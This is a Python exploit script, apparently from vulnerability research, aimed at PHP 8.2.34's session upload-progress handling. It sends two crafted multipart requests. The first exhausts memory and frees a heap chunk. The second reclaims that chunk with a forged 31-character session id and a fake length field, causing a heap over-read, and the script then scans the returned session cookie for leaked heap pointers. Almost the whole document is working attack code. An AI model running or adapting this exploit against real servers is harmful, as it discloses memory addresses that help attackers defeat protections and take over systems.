#!/usr/bin/env python3
"""sid_length=31 test on 8.2.34: forge a 31-char session id in request B.
prime(A): 1001 small + PHPSESSID=0 + upload_progress + 256MB big  -> OOM, free id chunk
reclaim(B): PHPSESSID=<31-char> + upload_progress + fillers + forged 79B(len=0x1000) -> over-read
Check Set-Cookie for heap (0x7F) pointers.
"""
import http.client, struct, time, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18111
H = 0x7F0000000000

def scan(data, need=8):
    best = {}
    for off in range(len(data) - 8):
        v = int.from_bytes(data[off:off+8], "little")
        if H <= v < H + 0x10000000000:
            best[v & ~0x1FFFFF] = best.get(v & ~0x1FFFFF, 0) + 1
    if best:
        b, c = max(best.items(), key=lambda kv: kv[1])
        if c >= 8: return b
    return 0

def do(req_lines, body, timeout=90):
    c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=timeout)
    c.putrequest("POST", "/", skip_host=True)
    for l in req_lines: c.putheader(l.split(":", 1)[0], l.split(":", 1)[1].strip())
    c.endheaders(); c.send(body)
    r = c.getresponse(); d = r.read(); c.close(); return d

def mp(parts, big=None):
    bd = "----b"; out = b""
    for name, val in parts:
        out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n").encode() + val + b"\r\n"
    if big:
        out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"big\"\r\n\r\n").encode() + big + b"\r\n"
    out += f"--{bd}--\r\n".encode(); return out

def cookie_of(r):
    for line in r.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"phpsessid" in line.lower():
            return line.split(b":", 1)[1].strip()
    return b""

def try_id(sid, fillers=841, big_mb=256):
    prime = [(f"p{i:04d}", b"x") for i in range(1001)]
    prime.append(("PHPSESSID", b"\x00")); prime.append(("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"))
    do(["Content-Type: multipart/form-data; boundary=b", "Content-Length: %d" % len(mp(prime, big=b"B"*(big_mb*1024*1024)))],
       mp(prime, big=b"B"*(big_mb*1024*1024)), timeout=90)
    time.sleep(0.3)
    rec = [("PHPSESSID", sid), ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(fillers):
        rec.append((str(1000+i), (f"v{i:04d}"+ "x"*44)[:48].encode()))
    forged = bytearray(b"A"*79); struct.pack_into("<Q", forged, 0x10, 0x1000); forged[0x18]=ord("L")
    rec.append(("1999", bytes(forged)))
    r2 = do(["Content-Type: multipart/form-data; boundary=b", "Content-Length: %d" % len(mp(rec))], mp(rec), timeout=60)
    ck = cookie_of(r2)
    return scan(ck), len(ck), ck

print(f"=== sid_length=31 leak test on {PORT} (8.2.34) ===")
for sidlen in [31]:
    sid = (b"a" * (sidlen-1) + b"B")  # 31-char forged id
    for fillers in [841]:
        base, cl, ck = try_id(sid, fillers)
        bs = ("0x%012x" % base) if base else "0x0"
        print(f"  idlen={len(sid)} fillers={fillers} -> cookie={cl}B base={bs}", flush=True)
        if base:
            print(f"    *** LEAK *** cookie sample: {ck[:120]!r}", flush=True)
        else:
            print(f"    cookie sample: {ck[:80]!r}", flush=True)
print("done")
